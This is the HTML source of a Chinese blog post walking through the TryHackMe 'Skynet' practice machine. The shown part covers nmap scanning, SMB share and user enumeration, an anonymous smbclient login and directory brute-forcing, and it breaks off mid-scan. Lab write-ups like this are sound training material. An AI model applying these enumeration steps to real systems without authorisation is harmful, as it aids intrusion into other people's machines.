@@ -1,0 +1,1278 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="Thm-Skynet, TEST &amp; 安全研究员">
+    <meta name="description" content="
+
+
+机器信息
+Skynet
+
+
+
+系统
+linux
+
+
+信息
+有点意思 使用smb  匿名访问 找到相关的 用户信息之后依旧是目录扫描扫到了 一个旁站是一个邮箱系统 可以试着登陆成功进入smb系统  之后再邮件系统中找到 更改密码的 登陆">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>Thm-Skynet | TEST &amp; 安全研究员</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+    
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">TEST &amp; 安全研究员</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>个人介绍</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友链</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">TEST &amp; 安全研究员</div>
+        <div class="logo-desc">
+            
+            不吃香菜 &amp; 安全研究员
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			个人介绍
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友链
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/k1t0111" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/k1t0111" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://raw.githubusercontent.com/k1t0111/blog/main/image/20240817104321.png')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">Thm-Skynet</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/tryhackme/">
+                                    <span class="chip bg-color">
+                                        tryhackme
+                                    </span>
+                                </a>
+                                
+                        </div>
+                        
+                </div>
+                <div class="col s5 right-align">
+                    
+                        <div class="post-cate">
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                                <a href="/categories/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/" class="post-category">
+                                    渗透靶场
+                                </a>
+                                
+                        </div>
+                        
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                    <div class="post-date info-break-policy">
+                        <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                            2024-08-17
+                    </div>
+                    
+
+                        
+                            <div class="post-date info-break-policy">
+                                <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                                    2025-01-23
+                            </div>
+                            
+
+                                
+                                    <div class="info-break-policy">
+                                        <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                                            2.5k
+                                    </div>
+                                    
+
+                                        
+                                            <div class="info-break-policy">
+                                                <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                                                    12
+                                                        分
+                                            </div>
+                                            
+
+                                                
+                                                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                                                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                                                            <span id="busuanzi_value_page_pv"></span>
+                                                    </div>
+                                                    
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.min.css">
+
+
+        
+
+                <div class="card-content article-card-content">
+                    <div id="articleContent">
+                        <table>
+<thead>
+<tr>
+<th>机器信息</th>
+<th>Skynet</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>系统</td>
+<td>linux</td>
+</tr>
+<tr>
+<td>信息</td>
+<td>有点意思 使用smb  匿名访问 找到相关的 用户信息之后依旧是目录扫描扫到了 一个旁站是一个邮箱系统 可以试着登陆成功进入smb系统  之后再邮件系统中找到 更改密码的 登陆可以找到 一个milesdyson的 私人目录 可以看到一个新的cms 之后就可以找到一个nday 远程文件包含 可以getshell 后使用 内核提权 拿到root权限</td>
+</tr>
+</tbody></table>
+<h3 id="0X01循例信息收集"><a href="#0X01循例信息收集" class="headerlink" title="0X01循例信息收集"></a>0X01循例信息收集</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2024-06-14 09:20 UTC</span><br><span class="line">Nmap scan report for ip-10-10-14-193.eu-west-1.compute.internal (10.10.14.193)</span><br><span class="line">Host is up (0.0054s latency).</span><br><span class="line">Not shown: 994 closed tcp ports (reset)</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">22/tcp  open  ssh</span><br><span class="line">80/tcp  open  http</span><br><span class="line">110/tcp open  pop3</span><br><span class="line">139/tcp open  netbios-ssn</span><br><span class="line">143/tcp open  imap</span><br><span class="line">445/tcp open  microsoft-ds</span><br><span class="line">MAC Address: 02:58:B4:7D:6E:6D (Unknown)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">详细扫描</span></span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 992331bbb1e943b756944cb9e82146c5 (RSA)</span><br><span class="line">|   256 57c07502712d193183dbe4fe679668cf (ECDSA)</span><br><span class="line">|_  256 46fa4efc10a54f5757d06d54f6c34dfe (ED25519)</span><br><span class="line">80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Skynet</span><br><span class="line">110/tcp open  pop3        Dovecot pop3d</span><br><span class="line">|_pop3-capabilities: TOP CAPA SASL RESP-CODES UIDL AUTH-RESP-CODE PIPELINING</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">143/tcp open  imap        Dovecot imapd</span><br><span class="line">|_imap-capabilities: IDLE ID SASL-IR post-login ENABLE Pre-login more capabilities have LITERAL+ OK LOGIN-REFERRALS listed LOGINDISABLEDA0001 IMAP4rev1</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)</span><br><span class="line">MAC Address: 02:58:B4:7D:6E:6D (Unknown)</span><br><span class="line"></span><br><span class="line">Aggressive OS guesses: Linux 3.10 - 3.13 (99%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.8 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Android 5.1 (92%), Android 7.1.1 - 7.1.2 (92%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   311: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">|_nbstat: NetBIOS name: SKYNET, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 000000000000 (Xerox)</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2024-06-14T09:22:35</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)</span><br><span class="line">|   Computer name: skynet</span><br><span class="line">|   NetBIOS computer name: SKYNET\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: skynet</span><br><span class="line">|_  System time: 2024-06-14T04:22:35-05:00</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.54 ms ip-10-10-14-193.eu-west-1.compute.internal (10.10.14.193)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="0X02资产梳理"><a href="#0X02资产梳理" class="headerlink" title="0X02资产梳理"></a>0X02资产梳理</h4><h3 id="0X10开放端口及服务"><a href="#0X10开放端口及服务" class="headerlink" title="0X10开放端口及服务"></a>0X10开放端口及服务</h3><ol>
+<li><p><strong>22&#x2F;tcp - SSH</strong></p>
+<ul>
+<li><strong>服务</strong>: OpenSSH 7.2p2 (Ubuntu 4ubuntu2.8)</li>
+<li><strong>操作系统</strong>: Ubuntu Linux</li>
+<li><strong>协议</strong>: SSH协议版本 2.0</li>
+<li><strong>SSH Hostkeys</strong>:<ul>
+<li>RSA 2048-bit key fingerprint: 992331bbb1e943b756944cb9e82146c5</li>
+<li>ECDSA 256-bit key fingerprint: 57c07502712d193183dbe4fe679668cf</li>
+<li>ED25519 256-bit key fingerprint: 46fa4efc10a54f5757d06d54f6c34dfe</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p><strong>80&#x2F;tcp - HTTP</strong></p>
+<ul>
+<li><strong>服务</strong>: Apache HTTP Server 2.4.18 (Ubuntu)</li>
+<li><strong>HTTP服务器头</strong>: Apache&#x2F;2.4.18 (Ubuntu)</li>
+<li><strong>HTTP标题</strong>: Skynet</li>
+</ul>
+</li>
+<li><p><strong>110&#x2F;tcp - POP3</strong></p>
+<ul>
+<li><strong>服务</strong>: Dovecot pop3d</li>
+<li><strong>POP3能力</strong>: TOP, CAPA, SASL, RESP-CODES, UIDL, AUTH-RESP-CODE, PIPELINING</li>
+</ul>
+</li>
+<li><p><strong>139&#x2F;tcp 和 445&#x2F;tcp - NetBIOS&#x2F;SMB</strong></p>
+<ul>
+<li><strong>服务</strong>: Samba smbd 4.3.11-Ubuntu</li>
+<li><strong>工作组</strong>: WORKGROUP</li>
+</ul>
+</li>
+<li><p><strong>143&#x2F;tcp - IMAP</strong></p>
+<ul>
+<li><strong>服务</strong>: Dovecot imapd</li>
+<li><strong>IMAP能力</strong>: IDLE, ID, SASL-IR, post-login, ENABLE, Pre-login, LITERAL+, OK, LOGIN-REFERRALS, LOGINDISABLEDA0001, IMAP4rev1</li>
+</ul>
+</li>
+</ol>
+<h3 id="主机信息"><a href="#主机信息" class="headerlink" title="主机信息"></a>主机信息</h3><ul>
+<li><strong>MAC地址</strong>: 02:58:B4:7D:6E:6D (未知制造商)</li>
+<li><strong>主机名</strong>: SKYNET</li>
+<li><strong>操作系统猜测</strong>:<ul>
+<li>主要为各种版本的Linux（例如3.10 - 3.13, 5.4, 3.16等）</li>
+<li>Android操作系统（5.1, 7.1.1 - 7.1.2）</li>
+</ul>
+</li>
+</ul>
+<h3 id="网络距离"><a href="#网络距离" class="headerlink" title="网络距离"></a>网络距离</h3><ul>
+<li>目标主机与扫描主机之间的网络跳数：1 hop</li>
+</ul>
+<h3 id="服务信息"><a href="#服务信息" class="headerlink" title="服务信息"></a>服务信息</h3><ul>
+<li><strong>时间偏移</strong>: 平均时钟偏移约为1小时40分钟</li>
+<li><strong>SMB安全模式</strong>:<ul>
+<li>消息签名已启用但不强制</li>
+</ul>
+</li>
+<li><strong>NetBIOS信息</strong>: 计算机名为SKYNET，域名为空</li>
+<li><strong>SMB时间</strong>: 当前时间为2024年6月14日09:22:35（UTC）</li>
+</ul>
+<blockquote>
+<p>**目前不能偏向究竟是何种操作系统 根据不同服务 可以看到不同的服务</p>
+</blockquote>
+<h3 id="0x20-smb445"><a href="#0x20-smb445" class="headerlink" title="0x20 smb445"></a>0x20 smb445</h3><blockquote>
+<p>先试试samba 4.3.11<br>暂时搁置 脚本扫一遍smb 协议</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>smb 445</th>
+<th>[[smb 445#namp 脚本探测]]</th>
+</tr>
+</thead>
+</table>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb-enum-shares: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   \\10.10.14.193\IPC$: </span><br><span class="line">|     Type: STYPE_IPC_HIDDEN</span><br><span class="line">|     Comment: IPC Service (skynet server (Samba, Ubuntu))</span><br><span class="line">|     Users: 2</span><br><span class="line">|     Max Users: &lt;unlimited&gt;</span><br><span class="line">|     Path: C:\tmp</span><br><span class="line">|     Anonymous access: READ/WRITE</span><br><span class="line">|     Current user access: READ/WRITE</span><br><span class="line">|   \\10.10.14.193\anonymous: </span><br><span class="line">|     Type: STYPE_DISKTREE</span><br><span class="line">|     Comment: Skynet Anonymous Share</span><br><span class="line">|     Users: 0</span><br><span class="line">|     Max Users: &lt;unlimited&gt;</span><br><span class="line">|     Path: C:\srv\samba</span><br><span class="line">|     Anonymous access: READ/WRITE</span><br><span class="line">|     Current user access: READ/WRITE</span><br><span class="line">|   \\10.10.14.193\milesdyson: </span><br><span class="line">|     Type: STYPE_DISKTREE</span><br><span class="line">|     Comment: Miles Dyson Personal Share</span><br><span class="line">|     Users: 0</span><br><span class="line">|     Max Users: &lt;unlimited&gt;</span><br><span class="line">|     Path: C:\home\milesdyson\share</span><br><span class="line">|     Anonymous access: &lt;none&gt;</span><br><span class="line">|     Current user access: &lt;none&gt;</span><br><span class="line">|   \\10.10.14.193\print$: </span><br><span class="line">|     Type: STYPE_DISKTREE</span><br><span class="line">|     Comment: Printer Drivers</span><br><span class="line">|     Users: 0</span><br><span class="line">|     Max Users: &lt;unlimited&gt;</span><br><span class="line">|     Path: C:\var\lib\samba\printers</span><br><span class="line">|     Anonymous access: &lt;none&gt;</span><br><span class="line">|_    Current user access: &lt;none&gt;</span><br><span class="line">| smb-enum-users: </span><br><span class="line">|   SKYNET\milesdyson (RID: 1000)</span><br><span class="line">|     Full name:   </span><br><span class="line">|     Description: </span><br><span class="line">|_    Flags:       Normal user account</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>可得信息</p>
+</blockquote>
+<ol>
+<li><p><strong>共享信息</strong>：</p>
+<ul>
+<li><strong>IPC$</strong>: 这是一个隐藏的IPC服务，允许匿名用户进行读写访问。路径为 <code>C:\tmp</code>。</li>
+<li><strong>anonymous</strong>: 这是一个匿名共享，允许匿名用户进行读写访问。路径为 <code>C:\srv\samba</code>。</li>
+<li><strong>milesdyson</strong>: 这是Miles Dyson的个人共享，但是不允许匿名用户访问。路径为 <code>C:\home\milesdyson\share</code>。</li>
+<li><strong>print$</strong>: 这是打印机驱动程序的共享，不允许匿名用户访问。路径为 <code>C:\var\lib\samba\printers</code>。</li>
+</ul>
+</li>
+<li><p><strong>用户信息</strong>：</p>
+<ul>
+<li><strong>SKYNET\milesdyson</strong>: 这是一个普通用户账户，RID为1000，没有提供全名或描述信</li>
+</ul>
+</li>
+</ol>
+<table>
+<thead>
+<tr>
+<th>共享资源</th>
+<th>[[smb 445#找到特定的资源如何做?#]]</th>
+</tr>
+</thead>
+<tbody><tr>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<h3 id="0x11-smb登陆"><a href="#0x11-smb登陆" class="headerlink" title="0x11 smb登陆"></a>0x11 smb登陆</h3><blockquote>
+<p>可以看到基本上匿名用户都有一个读写权限我们可以一一在匿名用户权限下 查看可以利用的文件</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient <span class="comment">//10.10.14.193/anonymous</span></span><br></pre></td></tr></table></figure>
+
+<p>其实这个时候我试了一下nfs感觉还是linux 的感觉多一些<br>找了一条通知消息</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">最近系统故障导致多个密码被更改。所有Skynet员工在看到这条消息后需要更改他们的密码。</span><br><span class="line"></span><br><span class="line">- 迈尔斯·戴森</span><br></pre></td></tr></table></figure>
+<p>试试milesdyson用户的私有文件思路断了</p>
+<h3 id="0x20-web"><a href="#0x20-web" class="headerlink" title="0x20 web"></a>0x20 web</h3><h5 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h5><h6 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http://10.10.104.193/ ----</span><br><span class="line">==&gt; DIRECTORY: http://10.10.104.193/admin/                              </span><br><span class="line">==&gt; DIRECTORY: http://10.10.104.193/config/                                                                                                          </span><br><span class="line">==&gt; DIRECTORY: http://10.10.104.193/css/                                             </span><br><span class="line">+ http://10.10.104.193/index.html (CODE:200|SIZE:523)                                   </span><br><span class="line">==&gt; DIRECTORY: http://10.10.104.193/js/                                                                                                                                </span><br><span class="line">+ http://10.10.104.193/server-status (CODE:403|SIZE:278)                                                                                                               </span><br><span class="line">==&gt; DIRECTORY: http://10.10.104.193/squirrelmail/  </span><br><span class="line">[21:32:40] 403 -  278B  - /.ht_wsr.txt                                      </span><br><span class="line">[21:32:40] 403 -  278B  - /.htaccess.orig                                   </span><br><span class="line">[21:32:40] 403 -  278B  - /.htaccess.sample</span><br><span class="line">[21:32:40] 403 -  278B  - /.htaccess.save</span><br><span class="line">[21:32:40] 403 -  278B  - /.htaccess_extra                                  </span><br><span class="line">[21:32:40] 403 -  278B  - /.htaccess_orig</span><br><span class="line">[21:32:40] 403 -  278B  - /.htaccessBAK</span><br><span class="line">[21:32:40] 403 -  278B  - /.htaccessOLD                                     </span><br><span class="line">[21:32:40] 403 -  278B  - /.htaccessOLD2</span><br><span class="line">[21:32:40] 403 -  278B  - /.html                                            </span><br><span class="line">[21:32:40] 403 -  278B  - /.htaccess_sc</span><br><span class="line">[21:32:40] 403 -  278B  - /.htm                                             </span><br><span class="line">[21:32:40] 403 -  278B  - /.httr-oauth                                      </span><br><span class="line">[21:32:40] 403 -  278B  - /.htpasswds</span><br><span class="line">[21:32:40] 403 -  278B  - /.htpasswd_test</span><br><span class="line">[21:32:41] 403 -  278B  - /.htaccess.bak1                                   </span><br><span class="line">[21:32:44] 403 -  278B  - /.php                                             </span><br><span class="line">[21:32:44] 403 -  278B  - /.php3                                            </span><br><span class="line">[21:33:05] 403 -  278B  - /admin/                                           </span><br><span class="line">[21:33:46] 403 -  278B  - /config/                                          </span><br><span class="line">[21:34:22] 403 -  278B  - /js/                                              </span><br><span class="line">[21:35:02] 403 -  